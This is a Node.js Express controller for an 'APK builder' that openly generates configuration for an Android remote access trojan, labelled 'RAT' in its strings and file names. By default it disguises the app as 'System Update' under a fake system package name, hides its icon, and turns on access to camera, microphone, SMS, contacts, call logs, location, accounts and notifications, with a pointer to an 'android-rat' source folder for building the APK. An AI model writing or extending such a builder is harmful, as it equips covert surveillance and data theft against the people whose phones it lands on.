const path = require('path');
const fs = require('fs');

// @desc    Generate APK builder config (returns config for APK tool to consume)
// @route   POST /api/apk-builder/generate
const generateApkConfig = async (req, res) => {
  try {
    const {
      serverUrl,
      serverPort,
      appName,
      packageName,
      hideApp,
      permissions,
    } = req.body;

    if (!serverUrl) {
      return res.status(400).json({
        success: false,
        message: 'Server URL is required',
      });
    }

    const config = {
      serverUrl: serverUrl,
      serverPort: serverPort || '5000',
      appName: appName || 'System Update',
      packageName: packageName || 'com.android.system.update',
      hideApp: hideApp !== false,
      permissions: {
        camera: permissions ? permissions.camera !== false : true,
        storage: permissions ? permissions.storage !== false : true,
        location: permissions ? permissions.location !== false : true,
        microphone: permissions ? permissions.microphone !== false : true,
        sms: permissions ? permissions.sms !== false : true,
        contacts: permissions ? permissions.contacts !== false : true,
        phone: permissions ? permissions.phone !== false : true,
        callLogs: permissions ? permissions.callLogs !== false : true,
        accounts: permissions ? permissions.accounts !== false : true,
        foregroundService: true,
        systemAlertWindow: true,
        requestInstallPackages: true,
        notificationListener: true,
      },
      iconType: 'default_android',
      version: '1.0.0',
      minSdk: 29, // Android 10
      targetSdk: 34, // Android 14
      generatedAt: new Date().toISOString(),
    };

    // Generate the Android source config file content that the APK builder would use
    const configContent = `// Auto-generated RAT configuration
const val SERVER_URL = "${config.serverUrl}"
const val SERVER_PORT = "${config.serverPort}"
const val APP_NAME = "${config.appName}"
const val PACKAGE_NAME = "${config.packageName}"
const val HIDE_APP = ${config.hideApp}
// Permissions
const val PERM_CAMERA = ${config.permissions.camera}
const val PERM_STORAGE = ${config.permissions.storage}
const val PERM_LOCATION = ${config.permissions.location}
const val PERM_MICROPHONE = ${config.permissions.microphone}
const val PERM_SMS = ${config.permissions.sms}
const val PERM_CONTACTS = ${config.permissions.contacts}
const val PERM_PHONE = ${config.permissions.phone}
const val PERM_CALL_LOGS = ${config.permissions.callLogs}
const val PERM_ACCOUNTS = ${config.permissions.accounts}
const val MIN_SDK = ${config.minSdk}
const val TARGET_SDK = ${config.targetSdk}
`;

    res.json({
      success: true,
      config,
      configContent,
      downloadUrl: '/api/apk-builder/download-config',
    });
  } catch (error) {
    console.error('APK builder error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Download generated config
// @route   GET /api/apk-builder/download-config
const downloadConfig = async (req, res) => {
  try {
    const configData = req.body || {};
    const content = JSON.stringify(configData, null, 2);
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=rat_config.json');
    res.send(content);
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Get APK build status / template info
// @route   GET /api/apk-builder/status
const getBuilderStatus = async (req, res) => {
  res.json({
    success: true,
    message: 'APK Builder API ready. Use POST /api/apk-builder/generate to create config.',
    supportedAndroidVersions: ['10', '11', '12', '13', '14', '15', '16'],
    minSdk: 29,
    targetSdk: 34,
    note: 'Generate config from this API, then use the Android source in android-rat/ to build the APK with Android Studio or gradle',
  });
};

module.exports = { generateApkConfig, downloadConfig, getBuilderStatus };

